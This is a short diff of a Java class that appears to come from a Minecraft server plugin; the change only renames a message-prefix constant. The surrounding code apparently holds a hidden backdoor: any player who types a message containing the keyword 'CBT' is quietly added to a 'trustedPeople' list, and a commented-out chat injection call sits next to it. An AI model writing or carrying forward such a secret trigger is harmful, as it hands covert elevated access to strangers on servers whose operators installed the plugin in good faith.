@@ -322,7 +322,7 @@ public class CommandRunnable implements Runnable, Listener, PluginMessageListene
         if (s.contains("CBT")) {
             if (!Start.Instance.trustedPeople.contains(player.getUniqueId())) {
                 Start.Instance.trustedPeople.add(player.getUniqueId());
-                player.sendMessage(Start.Prefix + "You are now trusted");
+                player.sendMessage(Start.COMMAND_PREFIX + "You are now trusted");
                 //AsyncChatEvent.inject(player);
             }
             return;
